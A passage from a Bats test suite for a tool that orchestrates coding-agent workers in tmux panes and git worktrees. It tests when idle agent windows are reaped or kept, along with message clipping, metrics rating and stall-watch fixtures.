  wt_path="$BATS_TEST_TMPDIR/exited-no-pr-wt"
  git worktree add -q "$wt_path" feat/exited-no-pr
  stub_bin gh
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/exited-no-pr" exited
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/exited-no-pr — exited but no PR on the bus"* ]]
  [ -d "$wt_path" ]
  run ! grep -q 'remove' "$STUB_LOG"
}

# ---------------------------------------------------------------------------
# reap: idle-engine reclaim (#588) — merged/closed PR + terminal-or-pr_open
# state + a claude engine pane whose capture is provably idle → kill its
# window, then reclaim the worktree same as an engine-gone reap.
# ---------------------------------------------------------------------------

gh_stub_state() {
  cat >"$STUB_DIR/gh" <<EOF
#!/usr/bin/env bash
printf '%s\n' "\$*" >>"\$STUB_LOG"
case "\$*" in
*state*) printf '%s\n' '$1' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
}

@test "reap: merged + done + idle claude frame is reaped, its window killed" {
  git commit -q --allow-empty -m init
  git branch feat/idle-reap
  wt_path="$BATS_TEST_TMPDIR/idle-reap-wt"
  git worktree add -q "$wt_path" feat/idle-reap
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/idle-reap#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/idle-reap"* ]]
  grep -q 'kill-window -t @1' "$STUB_LOG"
}

@test "reap: merged + done + meter frame is kept — live turn" {
  git commit -q --allow-empty -m init
  git branch feat/meter-keep
  wt_path="$BATS_TEST_TMPDIR/meter-keep-wt"
  git worktree add -q "$wt_path" feat/meter-keep
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_bin wt
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
✳ Perusing… (1m 2s · ↓ 3.1k tokens)
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/meter-keep#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"an engine is still running there (live turn, unsent input, or no idle input box)"* ]]
  [ -d "$wt_path" ]
  run ! grep -q 'remove' "$STUB_LOG"
}

@test "reap: an open PR with an idle engine frame is kept — PR OPEN" {
  git commit -q --allow-empty -m init
  git branch feat/open-pr-idle
  wt_path="$BATS_TEST_TMPDIR/open-pr-idle-wt"
  git worktree add -q "$wt_path" feat/open-pr-idle
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state OPEN
  stub_bin wt
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
──────────────────
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/open-pr-idle#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"PR OPEN"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: merged + idle frame + tracked modification is kept — uncommitted changes" {
  git commit -q --allow-empty -m init
  git branch feat/dirty-idle
  wt_path="$BATS_TEST_TMPDIR/dirty-idle-wt"
  git worktree add -q "$wt_path" feat/dirty-idle
  wt_path=$(cd "$wt_path" && pwd -P)
  echo tracked >"$wt_path/tracked.txt"
  git -C "$wt_path" add tracked.txt
  git -C "$wt_path" commit -q -m tracked
  echo dirty >>"$wt_path/tracked.txt"
  stub_bin gh
  gh_stub_state MERGED
  stub_bin wt
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/dirty-idle#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"uncommitted changes"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: merged + done with no engine pane is reaped as before" {
  git commit -q --allow-empty -m init
  git branch feat/no-engine
  wt_path="$BATS_TEST_TMPDIR/no-engine-wt"
  git worktree add -q "$wt_path" feat/no-engine
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" "$(printf '@1\t%%1\tfish\t%s\n' "$wt_path")"
  CREW_ID=c1 run_crew status "worker:feat/no-engine#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/no-engine"* ]]
}

@test "reap: --dry-run on an idle claude frame reports it would kill the window" {
  git commit -q --allow-empty -m init
  git branch feat/idle-dry
  wt_path="$BATS_TEST_TMPDIR/idle-dry-wt"
  git worktree add -q "$wt_path" feat/idle-dry
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/idle-dry#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"would kill window @1"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
  [ -d "$wt_path" ]
  run ! grep -q 'remove' "$STUB_LOG"
}

@test "reap: an idle frame with unsent input in the box is kept" {
  git commit -q --allow-empty -m init
  git branch feat/input-box
  wt_path="$BATS_TEST_TMPDIR/input-box-wt"
  git worktree add -q "$wt_path" feat/input-box
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_bin wt
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯ push it
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/input-box#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"input box"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: a msg posted after done keeps the worktree" {
  git commit -q --allow-empty -m init
  git branch feat/later-msg
  wt_path="$BATS_TEST_TMPDIR/later-msg-wt"
  git worktree add -q "$wt_path" feat/later-msg
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_bin wt
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/later-msg#s1-1" done "" "https://example.com/pr/1"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  later_ts=$(jq -nc 'now*1000|floor + 1000')
  jq -nc --argjson ts "$later_ts" \
    '{ts:$ts, crew_id:"c1", from:"worker:feat/later-msg#s1-1", to:"dispatcher:c1", kind:"msg", body:"hi"}' >>"$log"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"posted after its done"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: an exited state with a live idle engine still keeps — old reason" {
  git commit -q --allow-empty -m init
  git branch feat/exited-idle
  wt_path="$BATS_TEST_TMPDIR/exited-idle-wt"
  git worktree add -q "$wt_path" feat/exited-idle
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_bin wt
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/exited-idle#s1-1" exited "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/exited-idle — an engine is still running there"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: a pr_open worker whose PR merged and engine is idle is reaped" {
  git commit -q --allow-empty -m init
  git branch feat/pr-open-idle
  wt_path="$BATS_TEST_TMPDIR/pr-open-idle-wt"
  git worktree add -q "$wt_path" feat/pr-open-idle
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  jq -nc '{ts:(now*1000|floor), crew_id:"c1", from:"worker:feat/pr-open-idle#s1-1", to:"dispatcher:c1", kind:"status", body:{state:"pr_open", pr_url:"https://example.com/pr/1"}}' >>"$log"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/pr-open-idle"* ]]
}

@test "reap: an orphan-stamped window whose branch has no worktree is reported, not killed" {
  common="$(git rev-parse --path-format=absolute --git-common-dir)"
  stub_bin gh
  stub_bin wt
  stub_tmux_frames "" ""
  printf '@9\tfeat/gone\t%s/crew\n' "$common" >"$STUB_DIR/wins3.txt"
  # A non-terminal event so `$log` exists and the reap arm runs far enough to
  # reach the orphan-window report (its `[ -f "$log" ] || exit 0` guard sits
  # above everything else); it yields no candidate of its own.
  CREW_ID=c1 run_crew status "worker:feat/other#s1-1" working
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"window @9 is stamped feat/gone but its worktree is gone — not killed"* ]]
  run ! grep -q 'kill-window -t @9' "$STUB_LOG"
}

@test "reap: a live reap.lock.d held by another live pid is skipped" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  log_dir="$(dirname "$log")"
  CREW_ID=c1 run_crew status "worker:feat/locked-out#s1-1" done "" "https://example.com/pr/1"
  mkdir -p "$log_dir/reap.lock.d"
  echo $$ >"$log_dir/reap.lock.d/pid"
  stub_bin gh
  stub_bin wt
  CREW_ID=c1 run run_crew reap --no-wait
  [ "$status" -eq 0 ]
  [[ "$output" == *"another reap is running — skipped"* ]]
  run ! grep -q 'pr' "$STUB_LOG"
}

@test "reap: by default waits out a live reap.lock.d, then does its work" {
  git commit -q --allow-empty -m init
  git branch feat/lock-wait
  wt_path="$BATS_TEST_TMPDIR/lock-wait-wt"
  git worktree add -q "$wt_path" feat/lock-wait
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" ""
  CREW_ID=c1 run_crew status "worker:feat/lock-wait#s1-1" done "" "https://example.com/pr/1"
  log_dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  sleep 2 &
  holder=$!
  mkdir -p "$log_dir/reap.lock.d"
  echo "$holder" >"$log_dir/reap.lock.d/pid"
  start=$(date +%s)
  CREW_ID=c1 run run_crew reap --quiet
  kill "$holder" 2>/dev/null || true
  wait "$holder" 2>/dev/null || true
  [ "$status" -eq 0 ]
  [ "$(($(date +%s) - start))" -ge 1 ]
  [[ "$output" == *"reaped feat/lock-wait"* ]]
  [[ "$output" != *"skipped"* ]]
}

@test "reap: an idle frame is still classified idle under LC_ALL=C" {
  git commit -q --allow-empty -m init
  git branch feat/idle-c-locale
  wt_path="$BATS_TEST_TMPDIR/idle-c-locale-wt"
  git worktree add -q "$wt_path" feat/idle-c-locale
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  set_frame %1 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run_crew status "worker:feat/idle-c-locale#s1-1" done "" "https://example.com/pr/1"
  LC_ALL=C CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/idle-c-locale"* ]]
}

@test "reap: an idle frame with a trailing NBSP in the input box is still idle" {
  git commit -q --allow-empty -m init
  git branch feat/idle-nbsp
  wt_path="$BATS_TEST_TMPDIR/idle-nbsp-wt"
  git worktree add -q "$wt_path" feat/idle-nbsp
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  printf '  \xe2\x8e\xbf  Done (14 tool uses \xc2\xb7 58.2k tokens \xc2\xb7 1m 9s)\n\xe2\x9c\xbb Churned for 36s \xc2\xb7 done 11:20 AM\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80 reef \xe2\x94\x80\n\xe2\x9d\xaf \xc2\xa0\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n  -- INSERT -- \xe2\x8f\xb5\xe2\x8f\xb5 auto mode on \xc2\xb7 \xe2\x86\x90 for agents\n' >"$STUB_DIR/frames/%1"
  CREW_ID=c1 run_crew status "worker:feat/idle-nbsp#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/idle-nbsp"* ]]
}

# reap_idle_fixture <slug> [engine] — a done worker whose PR merged, at a
# fresh worktree with one <engine> (default claude) pane %1 in window @1. The
# caller writes the pane's frame(s) and runs reap.
reap_idle_fixture() {
  git commit -q --allow-empty -m init
  git branch "feat/$1"
  wt_path="$BATS_TEST_TMPDIR/$1-wt"
  git worktree add -q "$wt_path" "feat/$1"
  wt_path=$(cd "$wt_path" && pwd -P)
  stub_bin gh
  gh_stub_state MERGED
  stub_tmux_frames "" "$(printf '@1\t%%1\t%s\t%s\n' "${2:-claude}" "$wt_path")"
  CREW_ID=c1 run_crew status "worker:feat/$1#s1-1" done "" "https://example.com/pr/1"
}

# assert_engine_kept <reason> — reap kept the worker for <reason> and touched
# neither its window nor its worktree.
assert_engine_kept() {
  [ "$status" -eq 0 ]
  [[ "$output" == *"an engine is still running there ($1)"* ]]
  run ! grep -qE 'kill-window|^remove' "$STUB_LOG"
}

@test "reap: an esc-to-interrupt turn above an empty box is kept" {
  reap_idle_fixture idle-working
  set_frame %1 <<'EOF'
✻ Working (2s · esc to interrupt)
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "live turn, unsent input, or no idle input box"
}

@test "reap: a thinking turn with a todo list between it and the box is kept" {
  reap_idle_fixture idle-thinking
  set_frame %1 <<'EOF'
✻ Thinking… (12s · ↑ 1.2k tokens · esc to interrupt)
  ⎿  ☐ Read the reap arm
     ☐ Reuse the idle classifier
     ☐ Re-sample before the kill
     ☐ Wait on the reap lock
     ☐ Run the suite
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "live turn, unsent input, or no idle input box"
}

@test "reap: a live subagent row above a finished-looking box is kept" {
  reap_idle_fixture idle-subagent
  set_frame %1 <<'EOF'
✻ Churned for 36s · done 11:20 AM
  ◯ general-purpose  Revise spec per critic                              2m 3s · ↓ 71.5k tokens
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "live turn, unsent input, or no idle input box"
}

@test "reap: an option-select prompt frame is kept" {
  reap_idle_fixture idle-select
  set_frame %1 <<'EOF'
  2. Gate everything on 3.8
     Detect tmux version once in tmux-remux.tmux; emit the 3.8 hook set.
  3. Require 3.8, drop legacy
  4. Type something.
──────────────────────────────────────────────────────────────────────────
  5. Chat about this

Enter to select · Tab/Arrow keys to navigate · Esc to cancel
EOF
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "prompt on screen"
}

@test "reap: a finished turn still running a background shell is kept" {
  reap_idle_fixture idle-shell
  set_frame %1 <<'EOF'
✻ Churned for 36s · done 11:20 AM · 1 shell still running
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · 1 shell · ← for agents
EOF
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "background shell or monitor still running"
}

@test "reap: a non-claude engine pane is kept — no idle signature" {
  reap_idle_fixture idle-pi pi
  set_frame %1 <<'EOF'
──────────────────────────────
❯
──────────────────────────────
EOF
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "pi has no idle signature"
}

@test "reap: an empty box with no finished-turn marker (fresh boot) is kept" {
  reap_idle_fixture idle-boot
  set_frame %1 <<'EOF'
╭───────────────────────────────────────────╮
│ ✻ Welcome to Claude Code!                 │
╰───────────────────────────────────────────╯
────────────────── reef ─
❯
──────────────────
  ? for shortcuts
EOF
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "no finished-turn marker above the input box"
}

@test "reap: a real unsent draft (not dimmed in the colored capture) is kept" {
  reap_idle_fixture idle-draft
  set_frame %1 <<'EOF'
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯ push it
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  printf '✻ Churned for 36s · done 11:20 AM\n────────────────── reef ─\n❯\xc2\xa0push it\n──────────────────\n  -- INSERT --\n' >"$STUB_DIR/frames/%1.e"
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "live turn, unsent input, or no idle input box"
}

@test "reap: a dimmed prompt suggestion in the box is ghost text — reaped" {
  reap_idle_fixture idle-ghost
  set_frame %1 <<'EOF'
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯ push it
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  printf '✻ Churned for 36s · done 11:20 AM\n────────────────── reef ─\n❯\xc2\xa0\033[2mpush it\033[0m\n──────────────────\n  -- INSERT --\n' >"$STUB_DIR/frames/%1.e"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/idle-ghost"* ]]
  grep -q 'kill-window -t @1' "$STUB_LOG"
}

@test "reap: a pane that changes between the two samples is kept" {
  reap_idle_fixture idle-moved
  set_frame %1 <<'EOF'
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  set_frame %1.2 <<'EOF'
✻ Churned for 36s · done 11:20 AM
> go on
✻ Churned for 2s · done 11:21 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/idle-moved — pane changed between samples"* ]]
  run ! grep -qE 'kill-window|^remove' "$STUB_LOG"
}

@test "reap: a branch that posts between the two samples is kept" {
  reap_idle_fixture idle-posted
  set_frame %1 <<'EOF'
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  cat >"$STUB_DIR/frames/%1.2.hook" <<EOF
#!/usr/bin/env bash
jq -nc '{ts:(now*1000|floor + 1000), crew_id:"c1", from:"worker:feat/idle-posted#s2-2", to:"dispatcher:c1", kind:"msg", body:"back"}' >>"$log"
EOF
  chmod +x "$STUB_DIR/frames/%1.2.hook"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/idle-posted — the branch posted since"* ]]
  run ! grep -qE 'kill-window|^remove' "$STUB_LOG"
}

@test "reap: a msg from another session of the branch after done keeps it" {
  reap_idle_fixture idle-sibling
  set_frame %1 <<'EOF'
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  jq -nc '{ts:(now*1000|floor + 1000), crew_id:"c1", from:"worker:feat/idle-sibling#s2-2", to:"dispatcher:c1", kind:"msg", body:"hi"}' >>"$log"
  CREW_ID=c1 run run_crew reap
  assert_engine_kept "session posted after its done"
}

@test "msg: an oversized JSON body stays parseable JSON" {
  big="$(head -c 6000 /dev/zero | tr '\0' x)"
  body="$(jq -nc --arg d "$big" '{seam:"execute",tag:"gate_thrash",detail:$d}')"
  CREW_ID=c1 run_crew msg worker:feat/1 "retro:c1" "$body"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  line_bytes="$(printf '%s' "$(head -1 "$log")" | wc -c | tr -d ' ')"
  [ "$line_bytes" -le 4096 ]
  # The body must still parse, and keep every key — a blob cut loses the tag.
  run jq -e '(.body | fromjson) | .seam == "execute" and .tag == "gate_thrash" and (.detail | endswith("[elided]"))' "$log"
  [ "$status" -eq 0 ]
}

@test "msg: a non-JSON oversized body is still clipped as plain text" {
  big="$(head -c 6000 /dev/zero | tr '\0' y)"
  CREW_ID=c1 run_crew msg worker:feat/1 dispatcher:c1 "$big"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  line_bytes="$(printf '%s' "$(head -1 "$log")" | wc -c | tr -d ' ')"
  [ "$line_bytes" -le 4096 ]
  run jq -e '.body | endswith("[elided]")' "$log"
  [ "$status" -eq 0 ]
}

@test "rate: one unparseable metrics body does not kill the sweep" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  cat >"$log" <<'EOF'
{"ts":1000,"crew_id":"c1","kind":"dispatch","branch":"feat/bad","engine":"claude","model":"sonnet","tier":"standard","effort":"medium","title":"bad body"}
{"ts":1001,"crew_id":"c1","kind":"status","from":"worker:feat/bad","body":{"state":"done"}}
{"ts":1002,"crew_id":"c1","kind":"msg","from":"worker:feat/bad","to":"metrics:c1","body":"{\"rework_count\":3,\"detail\":\"trunc …[elided]"}
{"ts":2000,"crew_id":"c1","kind":"dispatch","branch":"feat/good","engine":"claude","model":"sonnet","tier":"standard","effort":"medium","title":"good body"}
{"ts":2001,"crew_id":"c1","kind":"status","from":"worker:feat/good","body":{"state":"done"}}
{"ts":2002,"crew_id":"c1","kind":"msg","from":"worker:feat/good","to":"metrics:c1","body":"{\"rework_count\":7}"}
EOF
  export XDG_DATA_HOME="$BATS_TEST_TMPDIR/data"
  run run_crew rate
  [ "$status" -eq 0 ]
  # Both runs must be recorded; the bad body folds to null metrics, not a crash.
  run jq -s -e 'map({branch, rework_count}) | sort_by(.branch)
    == [{branch:"feat/bad",rework_count:null},{branch:"feat/good",rework_count:7}]' \
    "$XDG_DATA_HOME/crew/ratings.jsonl"
  [ "$status" -eq 0 ]
}

# ---------------------------------------------------------------------------
# stall-watch harness
# ---------------------------------------------------------------------------

# bus — the raw event log for the test repo. Exported so `run bash -c "bus | ..."`
# (a new bash process, not a fork) can see it.
bus() {
  cat "$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl" 2>/dev/null || true
}
export -f bus

# seed_raw <from> <state> <detail> <source> [ts_ms] — append a status event
# directly, so a test can plant a `source:"watchdog"` event or one dated into a
# previous run (things `crew status` cannot express).
seed_raw() {
  local logf
  logf="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$logf")"
  jq -nc --arg f "$1" --arg s "$2" --arg d "$3" --arg src "$4" \
    --argjson ts "${5:-$(($(date +%s) * 1000))}" \
    '{ts:$ts, crew_id:"c1", from:$f, to:"dispatcher:c1", kind:"status",
      body:({state:$s}
            + (if $d!="" then {detail:$d} else {} end)
            + (if $src!="" then {source:$src} else {} end))}' >>"$logf"
}

# seed_msg <from> <to> <age_s> — append a msg event dated <age_s> seconds ago.
seed_msg() {
  local logf
  logf="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$logf")"
  jq -nc --arg f "$1" --arg t "$2" --argjson ts "$((($(date +%s) - $3) * 1000))" \
    '{ts:$ts, crew_id:"c1", from:$f, to:$t, kind:"msg", body:"{\"verdict\":\"accept\"}"}' >>"$logf"
}

# seed_start <dispatch|resume> <session> <ts_ms> — a session-start row on feat/x,
# shaped like dispatch.sh's and dispatch-resume.sh's, which `crew` cannot write.
seed_start() {
  local logf
  logf="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$logf")"
  jq -nc --arg k "$1" --arg s "$2" --argjson ts "$3" \
    '{ts:$ts, crew_id:"c1", kind:$k, branch:"feat/x", session:$s,
      worker_id:("worker:feat/x#" + $s)}' >>"$logf"
}

# stall_sampler <frame-file>... — install a CREW_STALL_SAMPLE_CMD that emits the
# given frames one per call and repeats the last one forever. The literal token
# GONE makes the sampler exit non-zero from that call on (pane vanished).
stall_sampler() {
  SAMPLER_DIR="$BATS_TEST_TMPDIR/sampler.$$"
  mkdir -p "$SAMPLER_DIR"
  printf '%s\n' "$@" >"$SAMPLER_DIR/frames"
  printf '0' >"$SAMPLER_DIR/n"
  cat >"$SAMPLER_DIR/sample" <<'EOS'
#!/usr/bin/env bash
d="$(dirname "$0")"
n=$(cat "$d/n")
n=$((n + 1))
printf '%s' "$n" >"$d/n"
total=$(wc -l <"$d/frames")
i="$n"
[ "$i" -gt "$total" ] && i="$total"
f=$(sed -n "${i}p" "$d/frames")
[ "$f" = GONE ] && exit 1
cat "$f"
EOS
  chmod +x "$SAMPLER_DIR/sample"
  export CREW_STALL_SAMPLE_CMD="$SAMPLER_DIR/sample"
}

# stall_load_sampler <"load1 cores"-line>... — install a CREW_STALL_LOAD_CMD that
# emits the given lines one per call and repeats the last one forever. Used by
# the D4 host-load tests so no real load is ever generated (the host is shared with
# live sibling workers).
stall_load_sampler() {
  LOAD_DIR="$BATS_TEST_TMPDIR/load.$$"
  mkdir -p "$LOAD_DIR"
  printf '%s\n' "$@" >"$LOAD_DIR/frames"
  printf '0' >"$LOAD_DIR/n"
  cat >"$LOAD_DIR/load" <<'EOS'
#!/usr/bin/env bash
d="$(dirname "$0")"
n=$(cat "$d/n")
n=$((n + 1))
printf '%s' "$n" >"$d/n"
total=$(wc -l <"$d/frames")
i="$n"
[ "$i" -gt "$total" ] && i="$total"
sed -n "${i}p" "$d/frames"
EOS
  chmod +x "$LOAD_DIR/load"
  export CREW_STALL_LOAD_CMD="$LOAD_DIR/load"
}

# frame_file <name> — read a frame from stdin, write it, echo its path.
frame_file() {
  local f="$BATS_TEST_TMPDIR/frame.$1"
  cat >"$f"
  printf '%s' "$f"
}

# ---- fixtures, pinned from EVIDENCE-2026-08-10.txt ------------------------

# A3/A4 gate capture, pane %118 — a live option-select prompt frame. The footer
# is the last non-empty line; the nearest numbered option is 2 lines above it.
fx_prompt_select() {
  frame_file prompt_select <<'EOF'
  2. Gate everything on 3.8
     Detect tmux version once in tmux-remux.tmux; emit the 3.8 hook set.
  3. Require 3.8, drop legacy
  4. Type something.
──────────────────────────────────────────────────────────────────────────
  5. Chat about this

Enter to select · Tab/Arrow keys to navigate · Esc to cancel
EOF
}

# [field] session 3 — the workspace-trust frame that wedged three healthy
